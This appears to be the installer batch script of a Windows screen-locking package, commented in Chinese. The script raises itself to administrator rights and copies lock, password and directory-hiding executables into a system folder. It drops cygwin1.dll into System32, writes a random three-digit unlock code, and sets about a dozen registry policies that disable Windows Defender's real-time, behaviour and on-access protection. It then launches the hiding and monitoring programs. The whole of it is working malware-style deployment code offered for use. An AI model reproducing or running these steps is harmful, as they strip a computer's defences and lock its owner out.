@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo 请求管理员权 ?..
    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0' -ArgumentList '%*'"
    exit /b
)
:: ========== 变量定义 ==========
set "SCRIPT_DIR=%~dp0"
set "SYS_DIR=C:\syslock_app"
set "SYSTEM32=%windir%\System32"
:: ========== 1. 复制 cygwin1.dll ==========
powershell -c "$mp=[Environment]::GetEnvironmentVariable('Path','Machine');if($mp -notmatch 'C:\\syslock_app'){[Environment]::SetEnvironmentVariable('Path',$mp+';C:\syslock_app','Machine')}"

copy /Y "%SCRIPT_DIR%cygwin1.dll" "%SYSTEM32%\" >nul

:: ========== 2. 判断是否需要首次部 ?==========
if not exist "%SYS_DIR%\coun.txt" (
    echo coun.txt 不存在，执行首次部署...

    if not exist "%SYS_DIR%" mkdir "%SYS_DIR%"
    
    if exist "%SCRIPT_DIR%unlockrun.exe" (
        copy /Y "%SCRIPT_DIR%unlockrun.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：unlockrun.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%syspop_up.exe" (
        copy /Y "%SCRIPT_DIR%syspop_up.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：syspop_up.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%syspass.exe" (
        copy /Y "%SCRIPT_DIR%syspass.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：syspass.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%syslockcoun.exe" (
        copy /Y "%SCRIPT_DIR%syslockcoun.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：syslockcoun.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%sysenvirmenmon.exe" (
        copy /Y "%SCRIPT_DIR%sysenvirmenmon.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：sysenvirmenmon.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%passw.txt" (
        copy /Y "%SCRIPT_DIR%passw.txt" "%SYS_DIR%\" >nul
    ) else ( echo 警告：passw.txt 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%lockrun_m.exe" (
        copy /Y "%SCRIPT_DIR%lockrun_m.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：lockrun_m.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%lock_bg.jpg" (
        copy /Y "%SCRIPT_DIR%lock_bg.jpg" "%SYS_DIR%\" >nul
    ) else ( echo 警告：lock_bg.jpg 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%HideDirectory.exe" (
        copy /Y "%SCRIPT_DIR%HideDirectory.exe" "%SYS_DIR%\" >nul
    ) else ( echo 警告：HideDirectory.exe 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%cygwin1.dll" (
        copy /Y "%SCRIPT_DIR%cygwin1.dll" "%SYS_DIR%\" >nul
    ) else ( echo 警告：cygwin1.dll 不存在，跳过 )
    
    if exist "%SCRIPT_DIR%coun.txt" (
        copy /Y "%SCRIPT_DIR%coun.txt" "%SYS_DIR%\" >nul
    ) else ( echo 警告：coun.txt 不存在，跳过 )

    if exist "%SCRIPT_DIR%coun.txt" (
        copy /Y "%SCRIPT_DIR%coun.txt" "%SYS_DIR%\" >nul
    ) else ( echo 警告：coun.txt 不存在，跳过 )

    if exist "%SCRIPT_DIR%unlockrun.ps1" (
        copy /Y "%SCRIPT_DIR%unlockrun.ps1" "%SYS_DIR%\" >nul
    ) else ( echo 警告：unlockrun.ps1 不存在，跳过 )

    if exist "%SCRIPT_DIR%syspass.ps1" (
        copy /Y "%SCRIPT_DIR%syspass.ps1" "%SYS_DIR%\" >nul
    ) else ( echo 警告：syspass.ps1 不存在，跳过 )

    :: 生成三位随机数写 ?passw.txt（覆盖原有内容）
    set /a rand=%random% %% 1000
    set "randstr=000!rand!"
    set "randstr=!randstr:~-3!"
    echo !randstr! > "%SYS_DIR%\passw.txt"
    echo 已生成随机码 !randstr! 

) else (
    echo coun.txt 已存在，跳过文件部署 ?
)

:: ========== 3. 修改注册表（禁用 Windows Defender ?==========
echo 正在修改 Windows Defender 注册表项...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableSpecialRunningModes" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 1 /f >nul

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f >nul
:: ========== 4. 运行 sysenvirmenmon.exe ==========
    start "" "%SYS_DIR%\HideDirectory.exe"
    start "" "%SYS_DIR%\sysenvirmenmon.exe"